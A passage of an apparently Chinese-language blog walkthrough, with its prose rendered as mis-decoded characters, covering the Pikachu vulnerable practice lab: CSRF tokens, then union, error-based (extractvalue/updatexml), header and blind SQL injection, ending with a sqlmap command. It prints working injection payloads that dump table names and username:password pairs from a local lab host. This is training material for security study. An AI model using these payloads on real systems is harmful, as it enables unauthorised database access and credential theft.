</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p>æ¨¡æ‹Ÿlucyè®¿é—®æˆ‘ä»¬ä¼ªé€ çš„æ¶æ„é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°é€šè¿‡csrfä¿®æ”¹äº†lucyçš„ä¿¡æ¯</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu35.png" alt="pikachu35"></p> <h2 id="csrf-token"><a href="#csrf-token" class="header-anchor">#</a> CSRF Token</h2> <p>CSRFçš„ä¸»è¦é—®é¢˜æ˜¯æ•æ„Ÿæ“ä½œçš„é“¾æ¥å®¹æ˜“è¢«ä¼ªé€ ï¼Œé‚£Tokenæ˜¯å¦‚ä½•é˜²æ­¢CSRFçš„ï¼š</p> <ul><li>æ¯æ¬¡è¯·æ±‚ï¼Œéƒ½å¢åŠ ä¸€ä¸ªéšæœºç ï¼ˆéœ€è¦å¤Ÿéšæœºï¼Œä¸å®¹æ˜“ä¼ªé€ ï¼‰ï¼Œåå°æ¯æ¬¡å¯¹è¿™ä¸ªéšæœºç è¿›è¡ŒéªŒè¯</li> <li>æ¯æ¬¡åˆ·æ–°é¡µé¢ï¼Œtokenå€¼éƒ½ä¼šå‘ç”Ÿå˜åŒ–ã€‚è¿™æ ·å°±é˜²æ­¢äº†CSRF</li></ul> <p>éšæ„ä¿®æ”¹å†…å®¹ï¼Œç¬¬ä¸€æ¬¡è¯·æ±‚åŒ…æ•°æ®å¦‚ä¸‹</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/vul/csrf/csrftoken/token_get_edit.php?sex=10086&amp;phonenum=10086&amp;add=10086&amp;email=10086&amp;token=78116632ec0a6bbe12219421110&amp;submit=submit</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">172.26.239.122</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://172.26.239.122/vul/csrf/csrftoken/token_get_edit.php</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=u19vivvv2j26lqb3622ebur90r</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>ç¬¬äºŒæ¬¡å¦‚ä¸‹</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/vul/csrf/csrftoken/token_get_edit.php?sex=10010&amp;phonenum=10010&amp;add=10010&amp;email=10010&amp;token=91613632ec0d3169d4241490211&amp;submit=submit</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">172.26.239.122</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://172.26.239.122/vul/csrf/csrftoken/token_get_edit.php</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=u19vivvv2j26lqb3622ebur90r</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>å¯ä»¥å‘ç°tokenå€¼æ˜æ˜¾ä¸åŒï¼ŒæœåŠ¡ç«¯å¯¹è¿™ä¸ªè¿›è¡Œæ ¡éªŒï¼Œ(tokenå€¼å¤Ÿéšæœºï¼Œé˜²æš´åŠ›ç ´è§£å¥½çš„è¯)å°±å¯ä»¥è¾ƒä¸ºæœ‰æ•ˆè¿‡æ»¤æ‰ä¼ªé€ çš„CSRFè¯·æ±‚</p> <h1 id="sql-inject"><a href="#sql-inject" class="header-anchor">#</a> SQL-Inject</h1> <h2 id="æ•°å­—å‹æ³¨å…¥-post"><a href="#æ•°å­—å‹æ³¨å…¥-post" class="header-anchor">#</a> æ•°å­—å‹æ³¨å…¥(post)</h2> <p>æŠ“åŒ…ï¼Œé€åˆ°Repeater</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu36.png" alt="pikachu36"></p> <p>idå­—æ®µå¯æ³¨å…¥ï¼Œæ•°å­—å‹</p> <p>æŸ¥å­—æ®µï¼Œorder byåˆ°3æŠ¥Unknown column '3' in 'order clause'ï¼Œè¯´æ˜å°±2ä¸ªå­—æ®µï¼Œidå­—æ®µæ³¨å…¥æ•°æ®å¦‚ä¸‹</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æŸ¥æ˜¾ç¤ºä½ï¼ˆ2ä¸ªæ˜¾ç¤ºä½ï¼‰ï¼Œpostæ•°æ®éƒ¨åˆ†å¦‚ä¸‹</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu37.png" alt="pikachu37"></p> <p>æŸ¥åº“åï¼ŒæŸ¥è¡¨å</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu38.png" alt="pikachu38"></p> <p>æŸ¥usersè¡¨ä¸‹çš„å­—æ®µåï¼ˆæŸ¥å…¶ä»–è¡¨å¯¹åº”æ›¿æ¢table_nameï¼‰</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token operator">and</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu39.png" alt="pikachu39"></p> <p>æŸ¥usersè¡¨ä¸‹çš„æ•°æ®</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> users
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu40.png" alt="pikachu40"></p> <h2 id="å­—ç¬¦å‹æ³¨å…¥-get"><a href="#å­—ç¬¦å‹æ³¨å…¥-get" class="header-anchor">#</a> å­—ç¬¦å‹æ³¨å…¥(get)</h2> <p>nameå­—æ®µå¯æ³¨å…¥ï¼Œå­—ç¬¦å‹ï¼Œå­—æ®µã€æ˜¾ç¤ºä½å•¥å°±ä¸æŸ¥äº†ï¼Œä¸€æ ·çš„</p> <p>æŸ¥ç”¨æˆ·ã€è¡¨å</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu41.png" alt="pikachu41"></p> <p>æŸ¥æ•°æ®åº“ç‰ˆæœ¬ã€usersè¡¨ä¸‹çš„å­—æ®µåï¼ˆæŸ¥å…¶ä»–è¡¨å¯¹åº”æ›¿æ¢table_nameï¼‰</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span><span class="token string">' union select version(),group_concat(column_name) from information_schema.columns where table_name='</span>users' <span class="token operator">and</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu42.png" alt="pikachu42"></p> <p>æŸ¥usersè¡¨ä¸‹çš„æ•°æ®</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> users<span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu40.png" alt="pikachu40"></p> <h2 id="æœç´¢å‹æ³¨å…¥"><a href="#æœç´¢å‹æ³¨å…¥" class="header-anchor">#</a> æœç´¢å‹æ³¨å…¥</h2> <p>è¿˜æ˜¯nameå­—æ®µå¯æ³¨å…¥ï¼Œæœç´¢å‹</p> <p>æŸ¥å­—æ®µï¼Œorder byåˆ°4æŠ¥Unknown column '4' in 'order clause'ï¼Œè¯´æ˜å°±3ä¸ªå­—æ®µï¼Œnameå­—æ®µæ³¨å…¥æ•°æ®å¦‚ä¸‹</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æŸ¥æ˜¾ç¤ºä½ï¼ˆ3ä¸ªæ˜¾ç¤ºä½ï¼‰</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æŸ¥æ“ä½œç³»ç»Ÿï¼ŒæŸ¥è¡¨å</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> @<span class="token variable">@version_compile_os</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æŸ¥usersè¡¨ä¸‹çš„å­—æ®µåï¼ˆæŸ¥å…¶ä»–è¡¨å¯¹åº”æ›¿æ¢table_nameï¼‰</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token string">' union select version(),@@version_compile_os,group_concat(column_name) from information_schema.columns where table_name='</span>users' <span class="token operator">and</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æŸ¥usersè¡¨ä¸‹çš„æ•°æ®</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> username<span class="token punctuation">,</span>id<span class="token punctuation">,</span>password <span class="token keyword">from</span> users<span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu43.png" alt="pikachu43"></p> <h2 id="xxå‹æ³¨å…¥"><a href="#xxå‹æ³¨å…¥" class="header-anchor">#</a> xxå‹æ³¨å…¥</h2> <p>nameå­—æ®µå¯æ³¨å…¥ï¼Œä»æŠ¥é”™å¯çŸ¥ï¼Œé—­åˆè¯­å¥éœ€è¦<code>')</code></p> <p>æŸ¥å­—æ®µï¼Œorder byåˆ°3æŠ¥Unknown column '3' in 'order clause'ï¼Œè¯´æ˜å°±2ä¸ªå­—æ®µï¼Œnameå­—æ®µæ³¨å…¥æ•°æ®å¦‚ä¸‹</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span>'<span class="token punctuation">)</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æŸ¥æ˜¾ç¤ºä½ï¼ˆ2ä¸ªæ˜¾ç¤ºä½ï¼‰</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span>'<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æŸ¥æ“ä½œç³»ç»Ÿï¼ŒæŸ¥è¡¨å</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span>'<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> @<span class="token variable">@version_compile_os</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æŸ¥usersè¡¨ä¸‹çš„å­—æ®µåï¼ˆæŸ¥å…¶ä»–è¡¨å¯¹åº”æ›¿æ¢table_nameï¼‰</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span><span class="token string">') union select @@version_compile_os,group_concat(column_name) from information_schema.columns where table_name='</span>users' <span class="token operator">and</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æŸ¥usersè¡¨ä¸‹çš„æ•°æ®</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>name<span class="token operator">=</span>'<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> users<span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu44.png" alt="pikachu44"></p> <h2 id="insert-update-æ³¨å…¥"><a href="#insert-update-æ³¨å…¥" class="header-anchor">#</a> &quot;insert/update&quot;æ³¨å…¥</h2> <p>usernameå­—æ®µå¯ä»¥æ³¨å…¥ï¼Œå­—ç¬¦å‹å•å¼•å·<code>'</code></p> <p>è¿™é‡Œé€‰usernameå­—æ®µï¼Œåˆ©ç”¨extractvalueå‡½æ•°æŠ¥é”™æ³¨å…¥</p> <p>æŸ¥è¡¨å</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>username<span class="token operator">=</span><span class="token string">' or extractvalue(1, concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) or '</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æŸ¥æ•°æ®åº“ç‰ˆæœ¬ã€usersè¡¨ä¸‹çš„å­—æ®µåï¼ˆæŸ¥å…¶ä»–è¡¨å¯¹åº”æ›¿æ¢table_nameï¼‰</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>username<span class="token operator">=</span><span class="token string">' or extractvalue(1, concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='</span>users<span class="token string">' and table_schema=database()),0x7e)) or '</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu45.png" alt="pikachu45"></p> <p>æŸ¥usersè¡¨ä¸‹çš„æ•°æ®</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>username<span class="token operator">=</span><span class="token string">' or extractvalue(1, concat(0x7e,(select group_concat(username,&quot;:&quot;,password) from users limit 0,1),0x7e)) or '</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="delete-æ³¨å…¥"><a href="#delete-æ³¨å…¥" class="header-anchor">#</a> &quot;delete&quot;æ³¨å…¥</h2> <p>ç‚¹å‡»åˆ é™¤ç•™è¨€æ—¶æ•°æ®åŒ…çš„idå­—æ®µå¯æ³¨å…¥ï¼Œæ•°å­—å‹ï¼Œæ•°æ®åŒ…å¦‚ä¸‹</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/vul/sqli/sqli_del.php?id=56</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">172.26.239.122</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://172.26.239.122/vul/sqli/sqli_del.php</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=u19vivvv2j26lqb3622ebur90r</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>è¿™æ¬¡ç”¨updataxmlå‡½æ•°æ¥æŠ¥é”™æ³¨å…¥</p> <p>æŸ¥è¡¨å</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>id<span class="token operator">=</span><span class="token number">56</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>@<span class="token variable">@version</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>tips:è¿™é‡Œæ˜¯getä¼ å‚çš„ï¼Œéœ€è¦urlç¼–ç </p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu46.png" alt="pikachu46"></p> <h2 id="httpå¤´æ³¨å…¥"><a href="#httpå¤´æ³¨å…¥" class="header-anchor">#</a> httpå¤´æ³¨å…¥</h2> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu47.png" alt="pikachu47"></p> <p>ç›´æ¥ç™»å½•è´¦å·ï¼Œå¯ä»¥å‘ç°è¿”å›çš„æ•°æ®åŒ…å¯¹ä¹‹å‰çš„UAç­‰HTTPå¤´æ•°æ®è¿›è¡Œäº†çºªå½•</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu48.png" alt="pikachu48"></p> <p>é‡æ–°æŠ“åŒ…ï¼Œå°è¯•åœ¨UAå¤„æµ‹è¯•æ³¨å…¥</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu49.png" alt="pikachu49"></p> <p>æµ‹è¯•å­˜åœ¨SQLæ³¨å…¥ï¼Œå­—ç¬¦å‹å•å¼•å·<code>'</code></p> <p>æŸ¥è¡¨å</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token string">' or updatexml(1,concat(0x7e,database()),1) or '</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu50.png" alt="pikachu50"></p> <p>æœ€åæŸ¥ä¸ªæ•°æ®å§ï¼Œå…¶ä»–çš„ä¸æŸ¥äº†ï¼Œéƒ½ä¸€æ ·</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token string">' or updatexml(1,concat(0x7e,(select group_concat(username,&quot;:&quot;,password) from users limit 0,1),0x7e),1) or '</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="ç›²æ³¨-base-on-boolian"><a href="#ç›²æ³¨-base-on-boolian" class="header-anchor">#</a> ç›²æ³¨(base on boolian)</h2> <p>æœç´¢ä¸å­˜åœ¨çš„ç”¨æˆ·ä¾‹å¦‚ï¼šhacker</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu51.png" alt="pikachu51"></p> <p>æç¤ºç”¨æˆ·ä¸å­˜åœ¨ï¼Œå†æœä¸€ä¸ªæœ‰çš„ï¼škobe</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu53.png" alt="pikachu53"></p> <p>ä¿å­˜æŠ“åˆ°çš„è¯·æ±‚åŒ…ä¸ºheader.txtå¦‚ä¸‹</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/vul/sqli/sqli_blind_b.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">172.26.239.122</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://172.26.239.122/vul/sqli/sqli_blind_b.php</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=u19vivvv2j26lqb3622ebur90r</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>sqlmapç›´æ¥å¼€è·‘</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>sqlmap <span class="token parameter variable">-r</span> header.txt â€“current-db
